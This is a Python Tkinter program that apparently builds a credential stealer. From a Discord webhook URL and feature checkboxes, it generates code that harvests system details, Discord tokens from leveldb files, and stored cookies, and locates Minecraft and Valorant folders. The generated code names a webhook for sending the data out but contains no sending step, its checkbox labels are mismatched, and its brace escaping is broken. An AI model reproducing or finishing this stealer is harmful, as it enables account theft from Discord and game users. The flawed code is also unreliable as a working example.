import tkinter as tk
from tkinter import messagebox

def generate_code(selected_features, webhook_url):
    """Generates Python code based on selected features."""
    # Ensure that the webhook URL is treated as a string (use single quotes to avoid issues)
    code = f"""import os
import platform
import socket
import requests
import json
import re
import sqlite3

# Discord webhook URL
WEBHOOK_URL = '{webhook_url}'

def get_system_info():
    '''Gather system information'''
    return {{
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Architecture": platform.architecture(),
        "Hostname": socket.gethostname(),
        "IP Address": socket.gethostbyname(socket.gethostname())
    }}\n"""
    
    # Append selected features to the code
    if 'System Info' in selected_features:
        code += """
def get_discord_tokens():
    '''Retrieve Discord tokens from local storage'''
    tokens = []
    paths = {{
        "Discord": os.path.join(os.getenv('APPDATA'), "discord", "Local Storage", "leveldb"),
        "Discord Canary": os.path.join(os.getenv('APPDATA'), "discordcanary", "Local Storage", "leveldb"),
        "Discord PTB": os.path.join(os.getenv('APPDATA'), "discordptb", "Local Storage", "leveldb")
    }}

    for platform, path in paths.items():
        try:
            for file_name in os.listdir(path):
                if file_name.endswith((".log", ".ldb")):
                    with open(os.path.join(path, file_name), 'r', errors='ignore') as file:
                        lines = [line.strip() for line in file.readlines() if line.strip()]
                        for line in lines:
                            tokens.extend(re.findall(r"[\w-]{{24}}\.[\w-]{{6}}\.[\w-]{{27}}", line))
                            tokens.extend(re.findall(r"mfa\.[\w-]{{84}}", line))
        except Exception as e:
            print(f"Error reading Discord tokens: {e}")
            continue
    return tokens
"""
    if 'Discord Info' in selected_features:
        code += """
def get_cookies():
    '''Retrieve cookies from local storage'''
    cookies = {{}}
    paths = {{
        "Discord": os.path.join(os.getenv('APPDATA'), "discord", "Local Storage"),
        "Discord Canary": os.path.join(os.getenv('APPDATA'), "discordcanary", "Local Storage"),
        "Discord PTB": os.path.join(os.getenv('APPDATA'), "discordptb", "Local Storage")
    }}

    for platform, path in paths.items():
        try:
            for file_name in os.listdir(path):
                if file_name.endswith(".sqlite"):
                    conn = sqlite3.connect(os.path.join(path, file_name))
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, value FROM cookies")
                    cookies.update({f"{host_key}{name}": value for host_key, name, value in cursor.fetchall()})
                    conn.close()
        except Exception as e:
            print(f"Error reading cookies: {e}")
            continue
    return cookies
"""
    if 'Minecraft Info' in selected_features:
        code += """
def get_minecraft_info():
    '''Gather Minecraft-related information'''
    info = {{}}
    try:
        minecraft_dir = os.path.join(os.getenv('APPDATA'), ".minecraft")
        if os.path.exists(minecraft_dir):
            info["Minecraft Directory"] = minecraft_dir
    except Exception as e:
        print(f"Error gathering Minecraft info: {e}")
    return info
"""
    if 'Valorant Info' in selected_features:
        code += """
def get_valorant_info():
    '''Gather Valorant-related information'''
    info = {{}}
    try:
        valorant_dir = os.path.join(os.getenv('APPDATA'), "Riot Games", "VALORANT")
        if os.path.exists(valorant_dir):
            info["Valorant Directory"] = valorant_dir
    except Exception as e:
        print(f"Error gathering Valorant info: {e}")
    return info
"""
    
    return code

def on_build_button_click():
    """Handle the build button click event."""
    webhook_url = webhook_entry.get()
    if not webhook_url:
        messagebox.showerror("Error", "Please enter a valid webhook URL")
        return

    selected_features = []
    if system_info_var.get():
        selected_features.append('System Info')
    if discord_info_var.get():
        selected_features.append('Discord Info')
    if minecraft_info_var.get():
        selected_features.append('Minecraft Info')
    if valorant_info_var.get():
        selected_features.append('Valorant Info')
    
    if not selected_features:
        messagebox.showerror("Error", "Please select at least one feature")
        return

    # Generate the code based on selected features and webhook URL
    code = generate_code(selected_features, webhook_url)
    
    # Display the generated code
    code_output.delete(1.0, tk.END)  # Clear previous code
    code_output.insert(tk.END, code)  # Display new code

# GUI setup
root = tk.Tk()
root.title("Code Generator")
root.geometry("600x500")
root.config(bg="black")

# Title
title_label = tk.Label(root, text="Select Features and Enter Webhook URL", fg="white", bg="black", font=("Helvetica", 16))
title_label.pack(pady=20)

# Feature selection checkboxes
system_info_var = tk.BooleanVar()
discord_info_var = tk.BooleanVar()
minecraft_info_var = tk.BooleanVar()
valorant_info_var = tk.BooleanVar()

system_info_check = tk.Checkbutton(root, text="System Info", variable=system_info_var, fg="white", bg="black", selectcolor="purple")
discord_info_check = tk.Checkbutton(root, text="Discord Info", variable=discord_info_var, fg="white", bg="black", selectcolor="purple")
minecraft_info_check = tk.Checkbutton(root, text="Minecraft Info", variable=minecraft_info_var, fg="white", bg="black", selectcolor="purple")
valorant_info_check = tk.Checkbutton(root, text="Valorant Info", variable=valorant_info_var, fg="white", bg="black", selectcolor="purple")

system_info_check.pack()
discord_info_check.pack()
minecraft_info_check.pack()
valorant_info_check.pack()

# Webhook URL entry
webhook_label = tk.Label(root, text="Enter Webhook URL:", fg="white", bg="black", font=("Helvetica", 12))
webhook_label.pack(pady=10)

webhook_entry = tk.Entry(root, width=50, fg="black", bg="white", font=("Helvetica", 12))
webhook_entry.pack(pady=10)

# Build button
build_button = tk.Button(root, text="Build", command=on_build_button_click, fg="white", bg="purple", font=("Helvetica", 14))
build_button.pack(pady=20)

# Code output area
code_output_label = tk.Label(root, text="Generated Code:", fg="white", bg="black", font=("Helvetica", 12))
code_output_label.pack(pady=10)

code_output = tk.Text(root, width=70, height=10, wrap=tk.WORD, fg="black", bg="white", font=("Courier", 10))
code_output.pack(pady=10)

# Start the GUI loop
root.mainloop()
